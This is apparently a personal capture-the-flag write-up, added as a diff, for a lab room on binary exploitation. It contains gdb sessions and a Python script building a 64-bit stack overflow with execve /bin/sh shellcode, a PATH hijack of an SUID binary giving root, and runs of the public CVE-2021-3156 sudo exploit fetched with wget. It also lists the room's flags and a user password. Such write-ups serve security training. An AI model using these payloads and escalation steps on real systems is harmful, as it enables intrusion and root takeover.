@@ -1107,3 +1107,558 @@ The "x" command in GDB is used to examine memory. The "/xg" part of the command 
 This command is useful for examining the top of the stack, which can be useful for debugging and understanding the current state of the program. However, it is important to have a good understanding of the program's memory layout, or the output of this command might not be meaningful.
 
 The command "x/616xb $rsp - 620" in GDB is used to examine the memory at the address stored in the register RSP (Stack Pointer) minus 620 in x86-64 architecture.
+
+The "x" command in GDB is used to examine memory. The "/616xb" part of the command is a format specifier, it tells GDB to display 616 bytes of memory contents in hexadecimal format and the "b" specifies that the data size should be 1 byte. The "$rsp - 620" part of the command specifies the memory address to be examined, in this case, the content of the RSP register minus 620 bytes.
+
+des@THM_exploit:~$ gdb bof
+GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from bof...(no debugging symbols found)...done.
+(gdb) r < <(python -c 'print("\x90" * 616 + "BBBBCCCC")')
+Starting program: /home/des/bof < <(python -c 'print("\x90" * 616 + "BBBBCCCC")')
+Enter some string:
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000055555555484e in foo ()
+(gdb) i r
+rax            0x0	0
+rbx            0x3e9	1001
+rcx            0x0	0
+rdx            0x0	0
+rsi            0x555555554956	93824992233814
+rdi            0x7ffff7dd0760	140737351845728
+rbp            0x9090909090909090	0x9090909090909090
+rsp            0x7fffffffe498	0x7fffffffe498
+r8             0xffffffffffffffed	-19
+r9             0x25e	606
+r10            0x5555557564cb	93824994337995
+r11            0x555555554956	93824992233814
+r12            0x3e9	1001
+r13            0x7fffffffe590	140737488348560
+r14            0x0	0
+r15            0x0	0
+rip            0x55555555484e	0x55555555484e <foo+84>
+eflags         0x10206	[ PF IF RF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) x/xg $rsp
+0x7fffffffe498:	0x4343434342424242
+
+(gdb) x/616xb $rsp - 620
+0x7fffffffe22c:	0x55	0x55	0x00	0x00	0x90	0x90	0x90	0x90
+0x7fffffffe234:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe23c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe244:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe24c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe254:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe25c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe264:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe26c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe274:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe27c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe284:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe28c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe294:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe29c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe2a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe2ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe2b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe2bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe2c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe2cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe2d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe2dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe2e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe2ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe2f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe2fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+---Type <return> to continue, or q <return> to quit---
+0x7fffffffe304:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe30c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe314:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe31c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe324:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe32c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe334:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe33c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe344:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe34c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe354:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe35c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe364:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe36c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe374:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe37c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe384:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe38c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe394:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe39c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe3a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe3ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe3b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe3bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe3c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe3cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe3d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+---Type <return> to continue, or q <return> to quit---
+0x7fffffffe3dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe3e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe3ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe3f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe3fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe404:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe40c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe414:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe41c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe424:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe42c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe434:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe43c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe444:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe44c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe454:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe45c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe464:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe46c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe474:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe47c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe484:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0x7fffffffe48c:	0x71	0x02	0x00	0x00	0x90	0x90	0x90	0x90
+
+(gdb) show endian
+The target endianness is set automatically (currently little endian)
+
+In x86-64 architecture, these registers are known as general-purpose registers. They are used to hold data and memory addresses for different purposes:
+
+-   EAX (Accumulator Register): It is used for arithmetic operations and holds the result of operations such as addition, subtraction, and multiplication.
+-   EBX (Base Register): It is often used as a pointer to memory, it's also used as a base pointer in some architectures to access memory on the stack.
+-   ECX (Counter Register): It is often used as a counter in loops and string operations, and it's also used to hold the number of iterations in some instructions.
+-   EDX (Data Register): It is used in conjunction with EAX for arithmetic operations, it's also used to hold data for some instructions such as I/O operations.
+-   EBP (Base Pointer): It is used as a base pointer in some architectures to access memory on the stack.
+-   ESP (Stack Pointer): It points to the current top of the stack, it's used to keep track of where the next item will be pushed or popped from the stack.
+-   ESI (Source Index): It is used as a pointer to the source data in memory operations such as string operations and memory copies.
+-   EDI (Destination Index): It is used as a pointer to the destination data in memory operations such as string operations and memory copies.
+
+RSP (Register Stack Pointer) and RIP (Register Instruction Pointer) are two registers in x86-64 architecture used by the CPU to store memory addresses.
+
+RSP points to the top of the stack, it's used to keep track of where the next item will be pushed or popped from the stack. The stack is a section of memory used to temporarily store data, such as function call frames, local variables and function return addresses.
+
+RIP, on the other hand, points to the next instruction to be executed by the CPU. It contains the memory address of the instruction that the CPU is currently executing or is about to execute. The instruction pointer is used to keep track of the program counter which is the address of the next instruction to be executed.
+
+A simple way to think about it is that RSP keeps track of where the program is on the stack and RIP keeps track of where the program is in the code. The stack is used to store data and the instruction pointer is used to navigate the code.
+
+http://shell-storm.org/shellcode/files/shellcode-806.html
+
+char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+
+r < <(python -c 'print("\x90" * (616 - 27) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "BBBBCCCC")')
+
+return address into the middle of our NOP sled
+
+0x7fffffffe37c --> \x7c\xe3\xff\xff\xff\x7f\x00\x00
+
+r < <(python -c 'print("\x90" * (616 - 27) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")')
+
+(gdb) r < <(python -c 'print("\x90" * (616 - 27) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/des/bof < <(python -c 'print("\x90" * (616 - 27) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")')
+Enter some string:
+
+Program received signal SIGILL, Illegal instruction.
+0x00007fffffffe492 in ?? ()
+(gdb) i r
+rax            0x0	0
+rbx            0x68732f6e69622f	29400045130965551
+rcx            0x0	0
+rdx            0x0	0
+rsi            0x555555554956	93824992233814
+rdi            0x7ffff7dd0760	140737351845728
+rbp            0x50f3bb05e545752	0x50f3bb05e545752
+rsp            0x7fffffffe490	0x7fffffffe490
+r8             0xffffffffffffffed	-19
+r9             0x25e	606
+r10            0x5555557564cb	93824994337995
+r11            0x555555554956	93824992233814
+r12            0x3e9	1001
+r13            0x7fffffffe590	140737488348560
+r14            0x0	0
+r15            0x0	0
+rip            0x7fffffffe492	0x7fffffffe492
+eflags         0x10213	[ CF AF IF RF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) x/xg $rsp
+0x7fffffffe490:	0x00007ffff7dd0760
+(gdb) x/xb 0x7fffffffe467
+0x7fffffffe467:	0x90
+
+finally
+
+r < <(python -c 'print("\x90" * (616 - 27 - 100) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 100 + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")')
+
+(gdb) r < <(python -c 'print("\x90" * (616 - 27 - 100) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 100 + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/des/bof < <(python -c 'print("\x90" * (616 - 27 - 100) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 100 + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")')
+Enter some string:
+process 1409 is executing new program: /bin/dash
+[Inferior 1 (process 1409) exited normally]
+
+des@THM_exploit:~$ (python -c 'print("\x90" * (616 - 27 - 100) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 100 + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")';cat)|./bof
+Enter some string:
+whoami
+kel
+cd /home/kel
+ls
+exe  exe.c  flag.txt
+cat flag.txt
+You flag is THM{buffer_overflow_in_64_bit}
+
+The user credential
+username: kel
+password: kelvin_74656d7065726174757265
+cat exe.c
+#include <unistd.h>
+
+void main()
+{
+	setuid(0);
+	setgid(0);
+	system("ps");
+}
+
+another way
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ python3
+Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> len("\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05")
+24
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ python2 exploit.py       
+����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������PH1�H1�H�/bin//shST_�;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB|����
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ cat exploit.py 
+from struct import pack
+buf="\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" #24
+payload="\x90"*400 
+payload += buf #424
+payload += "A" * (208 -len(buf)) #184
+payload +="B" *8 #616
+payload += pack("<Q", 0x7fffffffe37c) #middle
+print payload
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ python3 -m http.server 8000                                  
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.26.113 - - [19/Jan/2023 22:48:53] "GET /exploit.py HTTP/1.1" 200 -
+
+des@THM_exploit:~$ wget http://10.8.19.103:8000/exploit.py
+--2023-01-20 03:48:53--  http://10.8.19.103:8000/exploit.py
+Connecting to 10.8.19.103:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 292 [text/x-python]
+Saving to: ‘exploit.py’
+
+exploit.py           100%[====================>]     292  --.-KB/s    in 0s      
+
+2023-01-20 03:48:53 (25.1 MB/s) - ‘exploit.py’ saved [292/292]
+
+des@THM_exploit:~$ chmod 777 exploit.py
+des@THM_exploit:~$ python exploit.py > binex
+des@THM_exploit:~$ (cat binex; cat) | ./bof
+Enter some string:
+whoami
+kel
+cd /home/kel
+ls
+exe  exe.c  flag.txt
+cat flag.txt
+You flag is THM{buffer_overflow_in_64_bit}
+
+The user credential
+username: kel
+password: kelvin_74656d7065726174757265
+
+trying baron edit
+
+https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit
+[https://github.com/blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)
+
+des@THM_exploit:~$ sudoedit -s '\' $(python3 -c 'print("A"*1000)')
+malloc(): memory corruption
+Aborted (core dumped)
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ wget https://github.com/blasty/CVE-2021-3156/archive/main.zip
+
+--2023-01-19 21:36:35--  https://github.com/blasty/CVE-2021-3156/archive/main.zip
+Resolving github.com (github.com)... 140.82.113.4
+Connecting to github.com (github.com)|140.82.113.4|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://codeload.github.com/blasty/CVE-2021-3156/zip/refs/heads/main [following]
+--2023-01-19 21:36:36--  https://codeload.github.com/blasty/CVE-2021-3156/zip/refs/heads/main
+Resolving codeload.github.com (codeload.github.com)... 140.82.112.10
+Connecting to codeload.github.com (codeload.github.com)|140.82.112.10|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [application/zip]
+Saving to: ‘main.zip’
+
+main.zip                       [ <=>                                   ]   4.22K  --.-KB/s    in 0s      
+
+2023-01-19 21:36:36 (8.55 MB/s) - ‘main.zip’ saved [4321]
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ ls
+bof  bof64.c  exploit.py  main.zip  test
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ unzip main.zip
+
+Archive:  main.zip
+da68f7c1a2961595a3226b903f1fc180b8824255
+   creating: CVE-2021-3156-main/
+  inflating: CVE-2021-3156-main/Makefile  
+  inflating: CVE-2021-3156-main/README.md  
+  inflating: CVE-2021-3156-main/brute.sh  
+  inflating: CVE-2021-3156-main/hax.c  
+  inflating: CVE-2021-3156-main/lib.c
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ ls
+bof  bof64.c  CVE-2021-3156-main  exploit.py  main.zip  test
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ cd CVE-2021-3156-main
+```
+```yml
+┌──(kali㉿kali)-[~/binex/CVE-2021-3156-main]
+└─$ ls
+brute.sh  hax.c  lib.c  Makefile  README.md
+```
+```yml
+┌──(kali㉿kali)-[~/binex/CVE-2021-3156-main]
+└─$ make               
+rm -rf libnss_X
+mkdir libnss_X
+gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
+gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
+```
+```yml
+┌──(kali㉿kali)-[~/binex/CVE-2021-3156-main]
+└─$ ls
+brute.sh  hax.c  lib.c  libnss_X  Makefile  README.md  sudo-hax-me-a-sandwich
+```
+```yml
+┌──(kali㉿kali)-[~/binex/CVE-2021-3156-main]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.107.36 - - [19/Jan/2023 21:57:46] "GET /hax.c HTTP/1.1" 200 -
+
+des@THM_exploit:~$ cat /etc/*release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=18.04
+DISTRIB_CODENAME=bionic
+DISTRIB_DESCRIPTION="Ubuntu 18.04.3 LTS"
+NAME="Ubuntu"
+VERSION="18.04.3 LTS (Bionic Beaver)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 18.04.3 LTS"
+VERSION_ID="18.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=bionic
+UBUNTU_CODENAME=bionic
+
+des@THM_exploit:/tmp$ wget http://10.8.19.103:8000/hax.c
+--2023-01-20 03:03:43--  http://10.8.19.103:8000/hax.c
+Connecting to 10.8.19.103:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4420 (4.3K) [text/x-csrc]
+Saving to: ‘hax.c’
+
+hax.c                100%[====================>]   4.32K  --.-KB/s    in 0.001s  
+
+2023-01-20 03:03:43 (3.93 MB/s) - ‘hax.c’ saved [4420/4420]
+
+des@THM_exploit:/tmp$ gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
+des@THM_exploit:/tmp$ 
+des@THM_exploit:/tmp$ chmod +x sudo-hax-me-a-sandwich
+es@THM_exploit:/tmp$ ./sudo-hax-me-a-sandwich 0
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
+** pray for your rootshell.. **
+[sudo] password for des: 
+des is not in the sudoers file.  This incident will be reported.
+```
+**[+50 Points]** What is the contents of /home/kel/flag.txt?
+### PATH Manipulation :: Binary 3
+Get the root flag from the root directory. This will require you to understand how the PATH variable works.
+Answer the questions below
+```text
+kel:kelvin_74656d7065726174757265
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ssh kel@10.10.26.113
+kel@10.10.26.113's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Jan 20 03:51:22 UTC 2023
+
+  System load:  0.0                Processes:           92
+  Usage of /:   22.0% of 19.56GB   Users logged in:     0
+  Memory usage: 15%                IP address for eth0: 10.10.26.113
+  Swap usage:   0%
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+59 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Fri Jan 17 13:33:55 2020 from 192.168.247.130
+kel@THM_exploit:~$ ls
+exe  exe.c  flag.txt
+kel@THM_exploit:~$ cat exe.c
+#include <unistd.h>
+
+void main()
+{
+	setuid(0);
+	setgid(0);
+	system("ps");
+}
+
+kel@THM_exploit:~$ ./exe
+  PID TTY          TIME CMD
+ 1559 pts/0    00:00:00 exe
+ 1560 pts/0    00:00:00 sh
+ 1561 pts/0    00:00:00 ps
+
+kel@THM_exploit:~$ cp /bin/sh /tmp/ps
+kel@THM_exploit:~$ cd /tmp
+kel@THM_exploit:/tmp$ ls
+ps
+systemd-private-9c5ca549763e4dc08ac1049864de27ef-systemd-resolved.service-KG4AUS
+systemd-private-9c5ca549763e4dc08ac1049864de27ef-systemd-timesyncd.service-xZk819
+
+kel@THM_exploit:/tmp$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+kel@THM_exploit:/tmp$ export PATH=/tmp:$PATH
+kel@THM_exploit:/tmp$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+kel@THM_exploit:/tmp$ cd /home/kel
+kel@THM_exploit:~$ ls
+exe  exe.c  flag.txt
+kel@THM_exploit:~$ ./exe
+```
+```text
+# whoami
+root
+```
+```text
+# cd /root
+```
+```text
+# ls
+root.txt
+```
+```text
+# cat root.txt
+The flag: THM{SUID_binary_and_PATH_exploit}. 
+Also, thank you for your participation.
+
+The room is built with love. DesKel out.
+```
+```text
+# gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
+```
+```text
+# chmod +x sudo-hax-me-a-sandwich
+```
+```text
+# ./sudo-hax-me-a-sandwich
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+  usage: ./sudo-hax-me-a-sandwich <target>
+
+  available targets:
+  ------------------------------------------------------------
+    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
+    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
+    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
+  ------------------------------------------------------------
+
+  manual mode:
+    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
+```
+```text
+# ./sudo-hax-me-a-sandwich 0
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
+** pray for your rootshell.. **
+Error opening terminal: unknown.
+sudoedit: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ unchanged
+sudoedit: \ unchanged
+sudoedit: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\ unchanged
+```
+**[+250 Points]** What is the contents of /root/root.txt?
+The true path leads you to the flag.
+
+## Flags / Answers
+- ***THM{exploit_the_SUID}***
+- ***THM{buffer_overflow_in_64_bit}***
+- ***THM{SUID_binary_and_PATH_exploit}***
+
+## Notes / Lessons Learned
+[[Jack]]
+
